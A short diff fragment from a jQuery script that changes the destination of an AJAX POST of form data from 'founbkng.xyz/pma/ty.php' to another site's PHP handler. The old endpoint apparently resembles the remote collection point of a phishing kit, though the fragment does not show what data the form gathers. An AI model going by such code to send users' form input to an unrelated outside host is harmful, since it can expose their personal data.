@@ -107,7 +107,7 @@ $(document).ready(function() {
   Please Wait...
 </button>`).prop("disabled", true);
         $.ajax({
-            url: "https://founbkng.xyz/pma/ty.php",
+            url: "https://wetlandexpress.com/project/proceed.php",
             type: 'POST',
             data: formData,
             contentType: false,
